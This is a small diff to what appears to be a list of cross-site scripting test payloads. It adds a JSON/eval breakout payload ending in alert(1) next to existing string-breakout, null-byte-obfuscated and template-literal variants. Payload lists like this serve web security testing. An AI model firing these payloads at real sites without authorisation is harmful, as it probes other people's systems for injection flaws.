@@ -20,6 +20,10 @@
 \';alert(1)//
 \";alert(1)//
 x%2%007;a%00lert%601%60;%2%007
+
+# XSS in JSON, with eval
+\"-alert(1)}//
+
 # XSS in JavaScript template literals
 ${alert(1)}
 
